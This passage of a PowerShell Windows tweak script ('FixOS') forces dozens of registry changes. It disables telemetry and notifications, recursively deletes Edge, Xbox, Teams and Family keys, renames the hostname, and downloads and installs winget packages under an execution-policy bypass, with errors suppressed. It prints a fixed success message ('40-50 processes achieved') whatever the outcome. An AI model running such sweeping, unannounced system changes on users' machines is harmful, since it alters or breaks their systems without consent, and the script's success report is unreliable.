        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications"; N="ToastEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy"; N="SettingSyncEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy"; N="LocationServicesEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Personalization\Settings"; N="AcceptedPrivacyPolicy"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\InputPersonalization"; N="RestrictImplicitTextCollection"; V=1}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\InputPersonalization"; N="RestrictImplicitInkCollection"; V=1}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Feedback"; N="AutoSample"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Feedback"; N="ServiceEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced"; N="Start_TrackDocs"; V=0}
        @{P="HKCU:\Control Panel\International\User Profile"; N="HttpAcceptLanguageOptOut"; V=1}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced"; N="Start_TrackProgs"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications"; N="GlobalUserDisabled"; V=1}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppDiagnostics"; N="AppDiagnosticsEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization"; N="DODownloadMode"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication"; N="UseSignInInfo"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Maps"; N="AutoDownload"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Siuf\Rules"; N="NumberOfSIUFInPeriod"; V=0}
        @{P="HKCU:\SOFTWARE\Policies\Microsoft\Windows\CloudContent"; N="DisableTailoredExperiencesWithDiagnosticData"; V=1}
        @{P="HKCU:\SOFTWARE\Policies\Microsoft\Windows\CloudContent"; N="DisableWindowsConsumerFeatures"; V=1}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced"; N="ShowSyncProviderNotifications"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo"; N="Enabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\InputPersonalization\TrainedDataStore"; N="HarvestContacts"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\OperationStatusManager"; N="EnthusiastMode"; V=1}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced"; N="LaunchTo"; V=1}
        @{P="HKCU:\Control Panel\Desktop"; N="AutoEndTasks"; V=1}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"; N="HideSCAMeetNow"; V=1}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced"; N="TaskbarDeveloperSettings"; V=1}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced"; N="TaskbarEndTask"; V=1}
        @{P="HKCU:\Software\Policies\Microsoft\Windows\Explorer"; N="DisableNotificationCenter"; V=1}
        @{P="HKCU:\System\GameConfigStore"; N="GameDVR_FSEBehavior"; V=2}
        @{P="HKCU:\System\GameConfigStore"; N="GameDVR_Enabled"; V=0}
        @{P="HKCU:\System\GameConfigStore"; N="GameDVR_DXGIHonorFSEWindowsCompatible"; V=1}
        @{P="HKCU:\System\GameConfigStore"; N="GameDVR_HonorUserFSEBehaviorMode"; V=1}
        @{P="HKCU:\System\GameConfigStore"; N="GameDVR_EFSEFeatureFlags"; V=0}
        @{P="HKCU:\SOFTWARE\Policies\Microsoft\Windows\Explorer"; N="DisableSearchBoxSuggestions"; V=1}
        @{P="HKCU:\Control Panel\Keyboard"; N="InitialKeyboardIndicators"; T="String"; V="2"}
        @{P="HKCU:\Control Panel\Mouse"; N="MouseSpeed"; T="String"; V="0"}
        @{P="HKCU:\Control Panel\Mouse"; N="MouseThreshold1"; T="String"; V="0"}
        @{P="HKCU:\Control Panel\Mouse"; N="MouseThreshold2"; T="String"; V="0"}
        @{P="HKCU:\Control Panel\Accessibility\StickyKeys"; N="Flags"; T="String"; V="506"}
        @{P="HKCU:\Control Panel\Accessibility\StickyKeys"; N="HotkeyFlags"; T="String"; V="58"}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced"; N="TaskbarAcrylicOpacity"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced"; N="TaskbarSmallIcons"; V=1}
        @{P="HKCU:\Software\Policies\Microsoft\Windows\WindowsAI"; N="DisableAIDataAnalysis"; V=1}
        @{P="HKCU:\Software\Policies\Microsoft\Windows\Windows AI"; N="TurnOffSavingSnapshots"; V=1}
        @{P="HKCU:\Software\Microsoft\Multimedia\Audio"; N="UserDuckingPreference"; V=3}
        @{P="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"; N="EnableLUA"; V=3}
        @{P="HKCU:\Control Panel\Desktop"; N="UserPreferencesMask"; T="Binary"; V=([byte[]](0x90,0x12,0x03,0x80,0x10,0x00,0x00,0x00))}
        @{P="HKCU:\Control Panel\Desktop"; N="MenuShowDelay"; T="String"; V="0"}
        @{P="HKCU:\Control Panel\Desktop\WindowMetrics"; N="MinAnimate"; T="String"; V="0"}
        @{P="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"; N="TaskbarAnimations"; V=0}
        @{P="HKCU:\Software\Microsoft\Windows\DWM"; N="EnableAeroPeek"; V=0}
        @{P="HKCU:\Software\Microsoft\Windows\DWM"; N="Composition"; V=0}
        @{P="HKCU:\Software\Microsoft\Windows\DWM"; N="CompositionPolicy"; V=0}
    )

    foreach ($r in $registrySettings) {
        $type = if ($r.T) { $r.T } else { "DWord" }
        Set-RegistryForce -Path $r.P -Name $r.N -Value $r.V -Type $type
    }

    $regDeletions = @(
        "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\Orchestrator\UScheduler_Oobe\DevHomeUpdate"
        "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\Orchestrator\UScheduler_Oobe\OutlookUpdate"
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft Edge"
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft Edge Update"
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager\Subscriptions"
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager\SuggestedApps"
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e88865ea-0e1c-4e20-9aa6-edcd0212c87c}"
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{f874310e-b6b7-47dc-bc84-b9e6b38f5903}"
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e88865ea-0e1c-4e20-9aa6-edcd0212c87c}"
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{f874310e-b6b7-47dc-bc84-b9e6b38f5903}"
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{018D5C66-4533-4307-9B53-224DE2ED1FE6}"
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{018D5C66-4533-4307-9B53-224DE2ED1FE6}"
    )
    foreach ($path in $regDeletions) { Remove-RegistryKeyForce -Path $path }

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "com.squirrel.Teams.Teams" -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "com.squirrel.Teams.Teams" -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "LinkedIn" -Force -ErrorAction SilentlyContinue
    
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "Hostname" -Value "FixOs" -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "NV Hostname" -Value "FixOs" -Force

    try { Dism.exe /Online /Cleanup-Image /RestoreHealth *>$env:TEMP\dism.log } catch {}
    try { sfc /scannow *>$env:TEMP\sfc.log } catch {}

    $winget = "$env:LOCALAPPDATA\Microsoft\WindowsApps\winget.exe"
    if (-not (Test-Path $winget)) {
        Invoke-WebRequest -Uri "https://aka.ms/getwinget" -OutFile "$env:TEMP\Microsoft.DesktopAppInstaller.msixbundle"
        Add-AppxPackage -Path "$env:TEMP\Microsoft.DesktopAppInstaller.msixbundle"
        Start-Sleep -Seconds 5
    }

    if (Test-Path $winget) {
        $commonFlags = @("--exact","--silent","--accept-package-agreements","--accept-source-agreements","--source","winget")
        & $winget install --id Nilesoft.Shell @commonFlags
    }

    return $true
}

function Install-FixOS {
    Write-Host "[                    ] 0%" -NoNewline
    Start-Sleep -Milliseconds 100
    $optimizationResult = Start-WindowsOptimization
    Write-Host "`r[####                ] 25%" -NoNewline
    Start-Sleep -Milliseconds 100
    $registryResult = Apply-RegistryTweaks
    Write-Host "`r[##########          ] 50%" -NoNewline
    Start-Sleep -Milliseconds 100
    
    $finalRegKeys = @(
        "HKCU:\Software\Microsoft\OneDrive", "HKCU:\Software\Microsoft\Teams", "HKCU:\Software\Microsoft\XboxApp",
        "HKLM:\Software\Microsoft\Xbox", "HKLM:\Software\Microsoft\GamingServices",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\CloudExperienceHost", "HKCU:\Software\Microsoft\LinkedIn",
        "HKCU:\Software\Microsoft\Family"
    )
    foreach ($regKey in $finalRegKeys) { if (Test-Path $regKey) { Remove-Item -Path $regKey -Recurse -Force -ErrorAction SilentlyContinue } }
    
    Write-Host "`r[###############     ] 75%" -NoNewline
    Start-Sleep -Milliseconds 100
    Write-Host "`r[####################] 100%"
    Write-Host "Installation finished - Target: 40-50 processes achieved"
    Write-Host "Press any key to return to the Menu"
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    Show-Menu
}

try {
    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
    if ($Install) { Install-FixOS } else { Show-Menu }
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
